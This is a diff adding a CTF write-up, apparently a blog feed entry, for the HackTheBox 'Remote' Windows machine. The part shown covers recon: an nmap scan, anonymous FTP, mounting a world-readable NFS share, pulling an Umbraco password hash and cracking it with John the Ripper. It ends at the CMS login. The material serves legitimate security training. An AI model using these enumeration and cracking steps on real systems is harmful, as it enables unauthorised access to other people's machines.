@@ -12,6 +12,470 @@
     </author>
     
       <item>
+        <title>Remote - HackTheBox</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;In this CTF, we are going to be exploiting an Windows system. Through a well done recon, we will be able to find disclosed credentials, get a reverse shell and then escalate our privileges inside the machine. You can access this machine &lt;a href=&quot;https://app.hackthebox.com/machines/234&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s take a look at it!&lt;/p&gt;
+
+&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
+
+&lt;p&gt;The challenge description is:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Machine Info&lt;/p&gt;
+
+  &lt;p&gt;Remote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are found in a world-readable NFS share. Using these, an authenticated Umbraco CMS exploit is leveraged to gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; with these credentials returns a SYSTEM shell.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The challenge basically gave us all routes to do a good research and thorough recon. We need to find the credentials to log into the Umbraco CMS, where we will have an exploit (probably a CVE) that should give us a shell. From there, we exploit another CVE, but now for TeamViewer, to get the aministrator password. Finally, we get the SYSTEM shell using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; from impacket.&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
+
+&lt;p&gt;Let’s separate this into:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Reconnaissance&lt;/li&gt;
+  &lt;li&gt;Getting foothold&lt;/li&gt;
+  &lt;li&gt;Escalating privileges&lt;/li&gt;
+  &lt;li&gt;Flags&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;But first, let’s do our own recon as our step 1.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#mindset-step0&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;
+
+&lt;p&gt;The first thing we should do, is run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see what services and ports are open. We shall start with a simple nmap:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb/ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ports.nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 10.129.229.68
+&lt;span class=&quot;c&quot;&gt;# Nmap 7.94 scan initiated Sat Jan  6 10:36:32 2024 as: nmap -p- -T4 --min-rate 1000 -oN ports.nmap -A 10.129.229.68&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.229.68
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.29s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65519 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Home - Acme Widgets
+111/tcp   open  rpcbind?
+| rpcinfo: 
+|   program version    port/proto  service
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|_  100005  1,2,3       2049/udp6  mountd
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+2049/tcp  open  mountd        1-3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100005)&lt;/span&gt;
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+TCP/IP fingerprint:
+OS:SCAN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.94%E&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1/6%OT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;21%CT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%CU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;34700%PV&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2%DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;T%G&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%TM&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;65992EB7
+OS:%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FB%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10E%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%SS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;U&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+OS:SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FB%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10E%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RD%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%SS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;U&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;OPS&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;O1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANW8NNS%O2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M
+OS:53ANW8NNS%O3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANW8%O4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANW8NNS%O5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANW8NNS%O6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANNS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;WIN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;W1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%
+OS:W2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%W3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%W4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%W5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%W6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FF70&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ECN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AN
+OS:W8NNS%CC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AS%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+OS:0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T
+OS:4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+
+OS:%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y
+OS:%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;U1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%IPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;164%UN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%
+OS:RID&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%CD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Network Distance: 2 hops
+Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2024-01-06T13:40:44
+|_  start_date: N/A
+|_clock-skew: 3h01m32s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 587/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+HOP RTT       ADDRESS
+1   258.93 ms 10.10.16.1
+2   128.65 ms 10.129.229.68
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Sat Jan  6 10:43:03 2024 -- 1 IP address (1 host up) scanned in 390.87 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From this, we can see some interesting information. Let’s address each one of them.&lt;/p&gt;
+
+&lt;h3 id=&quot;port-21&quot;&gt;Port 21&lt;/h3&gt;
+
+&lt;p&gt;Nmap showed us that FTP port 21 is open and anonymous login is enabled. Let’s take a look at it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial ~/CTFs/htb/machines/Remote &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 10.129.229.68
+Connected to 10.129.229.68.
+220 Microsoft FTP Service
+Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.229.68:kaizen&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
+331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
+Password: 
+230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+226 Transfer complete.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;pwd
+&lt;/span&gt;257 &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt; is current directory.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, there is nothing in the FTP filesystem.&lt;/p&gt;
+
+&lt;h3 id=&quot;port-80&quot;&gt;Port 80&lt;/h3&gt;
+
+&lt;p&gt;On port 80, we have the web service.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/remote-htb1.png&quot; alt=&quot;Remote webservice homepage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon some clicks here and there, we end up at the login page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/remote-htb2.png&quot; alt=&quot;login page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From the machine description, we need to login into Umbraco CMS in order to exploit the vulnerability, so we are stuck here. Let’s move to the next interesting ports.&lt;/p&gt;
+
+&lt;h3 id=&quot;ports-139-445&quot;&gt;Ports 139, 445&lt;/h3&gt;
+
+&lt;p&gt;These are related to SMB. I tried to enumerate these manually, but with not success. It seems it is for authenticated users only. Let’s move to the NFS port.&lt;/p&gt;
+
+&lt;h3 id=&quot;port-2049&quot;&gt;Port 2049&lt;/h3&gt;
+
+&lt;p&gt;According to the machine description, the credentials to the Umbraco CMS lie somewhere in the NFS share. Let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;showmount&lt;/code&gt; to list available public shares:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;showmount &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; 10.129.229.68
+Export list &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.229.68:
+/site_backups &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;everyone&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we are able to connect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/site_backups&lt;/code&gt; share. From its name, it seems to be the backup files that makes the website up running. To connect, we need to create a mount point first with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir -p /tmp/mnt&lt;/code&gt; for example. Using &lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting&quot;&gt;HackTricks&lt;/a&gt;, we find the command to connect to the NFS share:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nfs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;vers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3,nolock &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;:/site_backups /tmp/mnt/
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/mnt
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/mnt &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
+App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Upon a quick research of where Umbraco stores passwords, we find &lt;a href=&quot;https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials&quot;&gt;this&lt;/a&gt; stackoverflow post. We see that it is inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;App_Data/Umbraco.sdf&lt;/code&gt; file:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/mnt &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; Umbraco.sdf &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f
+./App_Data/Umbraco.sdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;If we try to cat it, we will see that it seems like a binary file: unreadable. Let’s try to grep for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwordhash&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash&lt;/code&gt;. The last search yields:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/remote-htb3.png&quot; alt=&quot;password-hash&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Showing the password hash is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b8be16afba8c314ad33d812f22a04991b90e2aaa&lt;/code&gt; and uses SHA1 hash. We can also see that the admin’s email is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@htb.local&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We can use John The Ripper to crack this hash:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;:RAW-SHA1 &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;:/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Raw-SHA1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA1 128/128 AVX 4x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+No password hashes left to crack &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;see FAQ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--show&lt;/span&gt; hash.txt 
+?:baconandcheese
+
+1 password &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;cracked, 0 left
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;back-to-website&quot;&gt;Back to website…&lt;/h3&gt;
+
+&lt;p&gt;Now that we have the credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@htb.local:baconandcheese&lt;/code&gt;, let’s try and log in:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/remote-htb4.png&quot; alt=&quot;logged in webpage&quot; /&gt;&lt;/p&gt;
+
